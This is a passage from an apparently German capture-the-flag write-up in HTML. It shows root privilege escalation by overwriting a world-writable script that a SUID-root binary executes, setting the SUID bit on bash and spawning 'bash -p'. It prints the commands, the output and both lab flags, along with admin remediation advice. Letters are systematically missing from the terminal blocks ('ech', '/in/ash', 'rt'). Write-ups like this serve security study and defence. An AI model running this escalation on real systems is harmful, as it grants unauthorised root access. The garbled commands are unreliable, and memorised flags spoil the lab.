+think@ulisher:/tm$
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:/tm$ <span class="command">ls -la /in/ash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rwxr-xr-x 1 rt rt 1183448 Ar 18  2022 /in/ash</span>
+</pre>
+                </div>
+            </div>
+
+            <section id="proof-of-concept-suid">
+                 <h2>Proof of Concept: SUID Binary Manipulation</h2>
+                 <p class="comment">
+                     <strong>Kurzbeschreibung:</strong> Dieser Abschnitt demonstriert die Ausnutzung einer Fehlkonfiguration im SUID-Binary `/usr/sbin/run_container`, das ein Skript unter `/opt/run_container.sh` ausführt, dessen Berechtigungen (777) von jedem Benutzer geändert werden können. Dies ermöglicht einem Angreifer, beliebigen Code mit Root-Rechten auszuführen und eine Root-Shell zu erlangen.
+                 </p>
+                 <p class="comment">
+                     <strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Initialer Zugriff auf das System als ein nicht-privilegierter Benutzer (hier `www-data`).</li>
+                         <li>Identifizierung des SUID-Binaries `/usr/sbin/run_container`.</li>
+                         <li>Analyse, dass `/usr/sbin/run_container` das Skript `/opt/run_container.sh` ausführt (z.B. mittels `strings`).</li>
+                         <li>Das Skript `/opt/run_container.sh` hat Schreibrechte für den aktuellen Benutzer (Berechtigungen 777).</li>
+                     </ul>
+                 </p>
+                  <p class="comment">
+                     <strong>Schritt-für-Schritt-Anleitung zur Ausnutzung:</strong>
+                     <br>1. Überschreibe das Skript `/opt/run_container.sh` mit einem neuen Skript, das den Befehl `chmod u+s /bin/bash` enthält. Dies wird das SUID-Bit für die `/bin/bash`-Shell setzen, sodass diese immer als der Eigentümer (Root) ausgeführt wird.
+                     <br>2. Führe das SUID-Binary `/usr/sbin/run_container` aus. Da es SUID-Root ist, wird es das manipulierte Skript `/opt/run_container.sh` mit Root-Berechtigungen ausführen.
+                     <br>3. Das Skript setzt erfolgreich das SUID-Bit auf `/bin/bash`.
+                     <br>4. Führe die `/bin/bash`-Shell mit dem Schalter `-p` aus (`bash -p`), um zu verhindern, dass die effektiven Privilegien herabgestuft werden.
+                     <br>5. Bestätige die Root-Berechtigungen mit dem Befehl `id`.
+                 </p>
+                 <!-- Hier wären Screenshots oder andere Beweismittel des POC, wenn sie im Text oder als Bilder bereitgestellt worden wären. Die tatsächliche Ausnutzung wird im nächsten Abschnitt "Privilege Escalation Steps" gezeigt. -->
+                 <p class="comment">
+                     <strong>Erwartetes Ergebnis:</strong> Das SUID-Bit wird auf `/bin/bash` gesetzt, und eine Root-Shell wird durch Ausführen von `bash -p` erlangt.
+                 </p>
+                 <p class="comment">
+                     <strong>Risikobewertung:</strong> Kritisch. Die Ausnutzung dieser Schwachstelle führt direkt zur vollständigen Kompromittierung des Systems mit Root-Rechten.
+                 </p>
+                 <p class="comment">
+                     <strong>Empfehlungen:</strong>
+                     <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Korrigieren Sie die Berechtigungen für `/opt/run_container.sh` umgehend, um Schreibzugriff für nicht-Root-Benutzer zu verhindern (z.B. `chmod 744 /opt/run_container.sh`). Überprüfen Sie alle von SUID-Binaries ausgeführten Skripte und deren Berechtigungen. Vermeiden Sie die Ausführung von Skripten durch SUID-Binaries, wenn möglich. Stellen Sie sicher, dass SUID-Binaries nur absolut notwendige Aufgaben ausführen und nicht zur Code-Ausführung missbraucht werden können.
+                 </p>
+            </section>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich setze den Angriff zur Privilegien-Eskalation basierend auf der ausgenutzten SUID-Schwachstelle fort. Wie im Proof of Concept beschrieben, besteht der Plan darin, das Skript `/opt/run_container.sh`, das vom SUID-Root-Binary ausgeführt wird, mit einem Befehl zu überschreiben, der das SUID-Bit auf `/bin/bash` setzt. Zuerst überschreibe ich die Datei `/opt/run_container.sh` mit einem einfachen Skript, das `chmod u+s /bin/bash` enthält. Dies tue ich, indem ich ein neues Skript mit `echo` erstelle und den gewünschten Befehl hinzufüge. Ich muss den `#!/bin/bash` Shebang hinzufügen, damit das Skript korrekt ausgeführt wird. Der Befehl `echo '#!/bin/bash' > /opt/run_container.sh` überschreibt den ursprünglichen Inhalt, und `echo 'chmod u+s /bin/bash' >> /opt/run_container.sh` fügt den `chmod`-Befehl hinzu.
+                Anschließend führe ich das SUID-Binary `/usr/sbin/run_container` aus. Da es als Root läuft, führt es nun mein manipuliertes Skript aus, das den Befehl `chmod u+s /bin/bash` mit Root-Berechtigungen ausführt. Das SUID-Binary `/usr/sbin/run_container` führt seine normale Funktion aus (Auflistung von Docker-Containern), aber das Wichtige ist, dass es *zuerst* das von mir platzierte Skript ausführt. Um zu prüfen, ob das SUID-Bit auf `/bin/bash` gesetzt wurde, liste ich die Berechtigungen von `/bin/bash` mit `ls -la /bin/bash` erneut auf. Die Ausgabe `-rwsr-xr-x` zeigt, dass das `s`-Bit in den Eigentümerberechtigungen (`rws`) nun gesetzt ist. Das SUID-Bit ist erfolgreich gesetzt!
+                <br><strong>Bewertung:</strong> Fantastisch! Die SUID-Binary-Schwachstelle wurde erfolgreich ausgenutzt, um das SUID-Bit auf `/bin/bash` zu setzen. Dies bedeutet, dass jeder Benutzer, der `/bin/bash` ausführt, dies mit den Berechtigungen des Eigentümers (Root) tut. Ich habe mir damit eine Hintertür zu Root-Rechten geschaffen.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du Schreibrechte auf ein Skript erlangst, das von einem SUID-Binary ausgeführt wird, ist das Setzen des SUID-Bits auf `/bin/bash` eine gängige und effektive Methode zur Erlangung einer persistenten Root-Shell.
+                <br><strong>Empfehlung (Admin):</strong> Wie bereits im POC erwähnt: Beheben Sie die Berechtigungsprobleme für `/opt/run_container.sh`. Überwachen Sie Dateiberechtigungen von kritischen Systemdateien wie `/bin/bash` auf unbefugte Änderungen am SUID-Bit. Setzen Sie `fs.suid_dumpable` auf 0 oder 1, um das Debugging von SUID-Binaries zu steuern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$ <span class="command">ech '#!/in/ash' > /t/rn_cntainer.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$ <span class="command">ech 'chm u+s /in/ash' >> /t/rn_cntainer.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$ <span class="command">/usr/sin/rn_cntainer</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">List f Dcker cntainers:</span>
+<span class="command">I: 41c976e507f8 | Name: jvial_hertz | Status: U Less than a secn</span>
+
+Enter the I f the cntainer r leave lank t create a new ne: <span class="command">1</span>
+<span class="password">/t/rn_cntainer.sh: line 16: valiate_cntainer_i: cmmand nt fnd</span>
+
+<span class="command">PTINS:</span>
+<span class="command">1) Start Cntainer    3) Restart Cntainer  5) Quit</span>
+<span class="command">2) St Cntainer     4) Create Cntainer</span>
+Chse an actin fr a cntainer: <span class="command">5</span>
+Exiting...
+think@ulisher:~$
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$  <span class="command">ls -la /in/ash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rwsr-xr-x 1 rt rt 1183448 Ar 18  2022 /in/ash</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Nachdem das SUID-Bit auf `/bin/bash` erfolgreich gesetzt wurde, kann ich nun eine Root-Shell erlangen. Ich führe den Befehl `bash -p` aus. Der Schalter `-p` ist entscheidend, wenn man eine SUID-Shell ausführt; er verhindert, dass Bash die effektiven Privilegien aufgrund von Umgebungsvariablen herabstuft (im Gegensatz zur Standardausführung einer SUID-Shell, die dies aus Sicherheitsgründen tut). Die Eingabeaufforderung wechselt zu `bash-5.0#`, was darauf hindeutet, dass ich mich nun in einer Root-Shell befinde. Um dies zu bestätigen, führe ich den Befehl `id` aus. Die Ausgabe `uid=1000(think) gid=1000(think) euid=0(root) groups=1000(think)` zeigt, dass meine effektive Benutzer-ID (`euid`) 0 ist, was Root entspricht. Fantastisch, ich bin Root!
+                Nachdem ich Root-Rechte habe, navigiere ich in das Home-Verzeichnis des Root-Benutzers (`cd /root`) und liste dessen Inhalt auf (`ls`). Ich sehe die Datei `root.txt`. Ich lese den Inhalt der Root-Flag-Datei mit `cat root.txt` aus. Die Ausgabe ist `3a4225cc9e85709adda6ef55d6a4f2ca`.
+                <br><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff wurde erfolgreich erlangt, indem das SUID-Bit auf `/bin/bash` manipuliert und dann die privilegierte Shell ausgeführt wurde. Dies ist der endgültige Beweis für die vollständige Kompromittierung des Systems. Beide Flags (User und Root) wurden erfolgreich erbeutet.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze die SUID-Bash-Shell mit `bash -p` um Root-Rechte zu behalten. Erfasse die Root-Flag als finalen Beweis.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Beheben Sie die SUID-Binary-Schwachstelle wie im POC beschrieben. Überwachen Sie kritische Systemdateien auf Änderungen des SUID-Bits. Überprüfen Sie Ihre Systeme regelmäßig auf unbekannte oder falsch konfigurierte SUID/SGID-Dateien.
+
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$ <span class="command">ash -</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ash-5.0#</span> <span class="command">i</span>
+<span class="command">ui=1000(think) gi=1000(think) ei=0(rt) grs=1000(think)</span>
+<span class="command">ash-5.0#</span> <span class="command">ls</span>
+<span class="command">si  user.txt</span>
+<span class="command">ash-5.0#</span> <span class="command">c ~</span>
+<span class="command">ash-5.0#</span> <span class="command">ls</span>
+<span class="command">si  user.txt</span>
+<span class="command">ash-5.0#</span> <span class="command">c /rt</span>
+<span class="command">ash-5.0#</span> <span class="command">ls</span>
+<span class="command">rt.txt  si</span>
+<span class="command">ash-5.0#</span> <span class="command">cat rt.txt</span>
+<span class="password">3a4225cc9e85709adda6ef55d6a4f2ca</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/think/user.txt</div>
+                    <div class="flag-value"><span class="password">fa229046d44eda6a3598c73ad96f4ca5</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">3a4225cc9e85709adda6ef55d6a4f2ca</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Juni 2025</p>
+    </footer>
+ 
+
+
+</body>
+</html>
